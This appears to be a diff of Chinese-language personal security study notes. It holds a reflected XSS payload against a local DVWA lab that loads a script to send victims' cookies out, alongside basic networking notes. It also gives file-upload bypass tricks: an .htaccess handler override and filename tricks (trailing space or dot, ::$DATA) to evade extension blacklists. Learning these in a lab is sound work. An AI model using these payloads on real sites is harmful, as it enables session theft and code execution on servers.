@@ -83,6 +83,40 @@
 	堆叠注入：
 	就是利用;号写多个sql语句，有局限性，有些数据库支持执行多个语句，有些不行
 
-xss获取cookie，http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<script src="http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.js" /></script>
-利用xss漏洞，受害者点击链接就会访问目标网站，并且会加载<script src="http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.js" /></script>这段代码，此时hacker.js就可以获取受害者在目标网站的cookie，并将cookie发送到我的网站。
+
+---------------------------
+	xss获取cookie，http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<script src="http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.js" /></script>
+	利用xss漏洞，受害者点击链接就会访问目标网站，并且会加载<script src="http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.js" /></script>这段代码，此时hacker.js就可以获取受害者在目标网站的cookie，并将cookie发送到我的网站。
 		
+数据通信网络基础
+
+	网络通信：终端设备之间通过计算机网络进行的通信
+	应用层(Data)
+		http 	80	TCP
+		
+		Telnet 	23	TCP	远程登录协议，提供远程管理服务
+		
+		FTP		20、21	TCP	文件传输协议，提供互联网文件资源共享服务
+		
+		SMTP	25	TCP	简单邮件传输协议
+		
+		TFTP	69	UDP	简单文件传输协议，简单的文件传输
+		
+	传输层(Segment 段) 段里面会有源端口和目的端口的信息
+		TCP	面向连接、可靠的传输
+		三次握手、四次挥手；Seq：发送方发送数据包中第一个字节的序列号，Ack：接受方期望接收的数据包第一个字节的序列号，一般=Seq+数据长度
+		在TCP三次握手建立连接时，双方都会通过Window字段告诉对方本端最大能够接受的字节数（也就是缓冲区大小），如win=3
+		
+		UDP	无连接
+
+文件上传
+	.htaccess文件  
+	文件内容：<FilesMatch "shana">
+				SetHandler application/x-httpd-php
+				</FilesMatch>
+	如果文件夹下面有这样一个xxx.htaccess文件，那么该文件夹内的所有文件名为shana的文件都会被解析成php文件，如shana.png/shana.jpg/shana.txt
+	如果文件包含漏洞不可用，就可以尝试上传类似这样的.htaccess文件。
+	
+	”1.php “、”1.php.“第一个，系统会强制把后面的空格去掉变成1.php，第二个，系统不允许这样命名，也会变成1.php。所以这两个可以尝试绕过代码的过滤。
+	
+	必须是windows，必须是php，如1.php::$DATA，这样不会检测后缀名，并且上传后的文件名仍然是1.php。适合绕过黑名单
